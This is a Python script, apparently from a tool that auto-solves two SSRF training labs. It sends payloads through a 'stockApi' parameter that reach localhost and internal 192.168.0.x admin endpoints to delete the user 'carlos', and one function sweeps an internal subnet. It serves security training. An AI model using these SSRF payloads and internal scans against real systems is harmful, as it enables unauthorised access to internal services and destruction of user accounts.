import modules.MenuOperations as MenuOperations
import modules.VisualEffects as VisualEffects
import modules.RequestOperations as request
import modules.Variables as Variables
import modules.ExitProgram as ExitProgram
import modules.Texts as Texts


def menu():
    MenuOperations.vulnerability_labs_menu("SSRF", {
        1: "Basic SSRF against the local server",
        2: "Basic SSRF against another back-end system",
    })


def solve_lab_1():
    VisualEffects.loading_effect(Texts.deleting_carlos_s_account_text, 2)

    delete_carlos_payload = "http://localhost/admin/delete?username=carlos"
    data = {"stockApi": delete_carlos_payload}
    request.session.post(Variables.url + Variables.check_stock_path, data=data, verify=False, proxies=Variables.proxies)

    response = request.session.get(Variables.url, verify=False, proxies=Variables.proxies)
    if Texts.lab_solved_text in response.text:
        print(Texts.successfully_deleted_carlos_text)
        

def solve_lab_2():
    print("Searching for admin hostname...")
    print("this may take some time")
    for i in range(1, 256):
        print(f"{i}/255", end="\r")
        hostname = f"http://192.168.0.{i}:8080/admin"
        data = {"stockApi": hostname}

        response = request.session.post(Variables.url + Variables.check_stock_path, data=data, verify=False, proxies=Variables.proxies)

        if response.status_code == 200:
            VisualEffects.paas_ascii_art()
            print("[+] hostname found!")
            admin_ip_address = f"192.168.0.{i}"

            VisualEffects.loading_effect(Texts.deleting_carlos_s_account_text, 1)
            payload = f"http://{admin_ip_address}:8080/admin/delete?username=carlos"
            data = {"stockApi": payload}

            # I left it like this because of the problem in the lab
            print(Texts.successfully_deleted_carlos_text)
            request.session.post(Variables.url + Variables.check_stock_path, data=data, verify=False, proxies=Variables.proxies)
            ExitProgram.success()